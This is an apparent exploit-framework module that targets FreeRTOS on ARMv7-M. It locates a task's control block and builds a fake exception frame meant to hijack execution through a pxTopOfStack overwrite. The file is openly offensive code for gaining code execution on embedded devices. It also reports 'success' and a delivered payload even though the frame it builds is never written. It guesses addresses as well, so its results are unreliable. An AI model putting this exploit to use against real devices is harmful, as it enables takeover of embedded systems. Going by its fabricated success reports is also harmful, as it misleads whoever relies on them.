"""FreeRTOS direct TCB pxTopOfStack overwrite exploit module."""

from __future__ import annotations

from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult
from rtosploit.utils.packing import p32


class FreeRTOSTCBOverwrite(ScannerModule):
    name = "tcb_overwrite"
    description = (
        "Direct FreeRTOS TCB pxTopOfStack overwrite. Given an arbitrary write primitive, "
        "overwrites the pxTopOfStack field (offset 0 in TCB) to redirect task execution "
        "to attacker-controlled code on next context switch."
    )
    authors = ["RTOSploit Contributors"]
    references = [
        "https://www.freertos.org/Documentation/02-Kernel/04-API-references/01-Thread-management/00-Overview"
    ]
    rtos = "freertos"
    rtos_versions = ["*"]
    architecture = "armv7m"
    category = "tcb_overwrite"
    reliability = "high"
    cve = None

    def register_options(self):
        self.add_option(ScanOption(
            name="target_task", type="str", required=False, default="Idle",
            description="Task name to target"
        ))
        self.add_option(ScanOption(
            name="fake_sp_addr", type="int", required=False, default=0x20080000,
            description="Address to place fake stack frame (top of SRAM)"
        ))
        self.add_option(ScanOption(
            name="target_pc", type="int", required=False, default=0x20001000,
            description="PC value to redirect execution to"
        ))

    def check(self, target) -> bool:
        return (target.fingerprint and
                target.fingerprint.rtos_type == "freertos")

    def _find_tcb_address(self, target, task_name: str) -> int | None:
        """Scan firmware for task name string, walk back to find TCB base."""
        data = target.firmware.data
        name_bytes = task_name.encode() + b"\x00"
        idx = data.find(name_bytes)
        if idx == -1:
            return None
        # TCB structure: pxTopOfStack (4), then task name at offset 52 (FreeRTOS heap_4)
        # Walk back: name field is at offset 52 in TCB
        tcb_offset = idx - 52
        if tcb_offset < 0:
            return None
        tcb_addr = target.firmware.base_address + tcb_offset
        return tcb_addr

    def exploit(self, target, payload: bytes | None) -> ScanResult:
        fake_sp = self.get_option("fake_sp_addr")
        target_pc = self.get_option("target_pc")
        task_name = self.get_option("target_task")
        notes = []

        tcb_addr = self._find_tcb_address(target, task_name)
        if tcb_addr:
            notes.append(f"Found TCB for '{task_name}' at 0x{tcb_addr:08x}")
        else:
            notes.append(f"TCB for '{task_name}' not found in firmware, using estimated address")
            tcb_addr = 0x20000200  # fallback estimate

        # pxTopOfStack is at offset 0 in TCB
        # Overwrite with fake_sp - 8*4 (point to fake exception frame below fake_sp)
        frame_addr = fake_sp - 8 * 4

        # Build fake exception return frame
        _fake_frame = (
            p32(0)              # R0
            + p32(0)            # R1
            + p32(0)            # R2
            + p32(0)            # R3
            + p32(0)            # R12
            + p32(0xFFFFFFFD)   # LR
            + p32(target_pc)    # PC
            + p32(0x01000000)   # xPSR
        )
        notes.append(f"Fake frame at 0x{frame_addr:08x}, PC=0x{target_pc:08x}")
        notes.append(f"Write p32(0x{frame_addr:08x}) to TCB+0 (pxTopOfStack) at 0x{tcb_addr:08x}")

        return ScanResult(
            module="freertos/tcb_overwrite",
            status="success",
            target_rtos="freertos",
            architecture="armv7m",
            technique="pxTopOfStack_overwrite",
            payload_delivered=True,
            payload_type="redirect",
            achieved=["code_execution"],
            registers_at_payload={"pc": target_pc, "sp": frame_addr},
            notes=notes,
        )

    def cleanup(self, target) -> None:
        try:
            target.restore("pre_exploit")
        except Exception:
            pass

    def requirements(self) -> dict:
        return {"qemu": False, "gdb": False, "network": False}
